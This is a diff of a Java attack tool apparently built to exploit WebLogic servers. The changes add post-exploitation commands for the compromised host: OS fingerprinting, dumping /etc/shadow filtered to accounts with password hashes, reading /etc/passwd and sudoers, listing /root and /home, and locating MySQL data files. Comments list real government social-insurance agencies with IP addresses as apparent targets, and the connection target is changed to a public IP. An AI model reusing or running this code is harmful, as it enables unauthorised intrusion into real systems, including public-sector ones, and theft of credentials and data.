@@ -140,12 +140,12 @@ public class MTX_AttackWeblogic extends DoNmapResult
 		}
 		else
 		{
-			getCmd(szFile,"uname -a;w;id;who");
+			getCmd(szFile,"uname -a;find /etc -regex \"(redhat\\-release)|(issue)\" -exec cat \"{}\" \\;;find /proc -name version -exec cat -rf \"{}\" \\;;w;id;who");
 			 a = new String[]{
 					 "系统是什么版本?",
 					 "cat /etc/issue ; cat /etc/*-release ; cat /etc/lsb-release ; cat /etc/redhat-release",
 					 "是root吗？",
-					 "cat /etc/sudoers;cat /etc/passwd ;cat /etc/group ;cat /etc/shadow ;ls -alh /var/mail/;ls -ahlR /home/;ls -ahlR /root/",
+					 "cat /etc/sudoers;cat /etc/passwd | grep  '/bin/bash';cat /etc/group ; cat /etc/shadow | grep -v ':!!:' | grep -v ':\\*:' | grep -v ':!:' ;ls -alh /var/mail/;ls -ahlR /home/;ls -ahlR /root/",
 					 "查找mysql数据文件",
 					 "find /var/lib/mysql/ -regex \".*\\.frm\\|.*\\.idb\\|.*\\.MYI\\|.*\\.MYD\"",
 					 "历史操作信息",
@@ -564,13 +564,15 @@ public class MTX_AttackWeblogic extends DoNmapResult
 			// 长春社会保险 222.168.33.108 9001
 			// 吉林省社会医疗保险管理局 http://www.jlyb.gov.cn/  124.42.10.247
 			String []a1 = 
-					"7001"
+					"80"
 					.split(",");
 			// 218.6.145.89
 			for(int i = 0; i < a1.length; i++)
 			{
-				ma.connSvr("192.168.8.42", a1[i], null, null);
+				// sudo tcpdump port 8888 and tcp and dst host 117.36.52.42 -vv -i en0 -w 888.cap 
+				ma.connSvr("189.211.189.145", a1[i], null, null);
 			}
+//			System.out.println(Integer.toHexString('!'));
 //			final MyExecutors met = MyExecutors.getInstance();
 //			final String []a1 = 
 //					"7001,80"
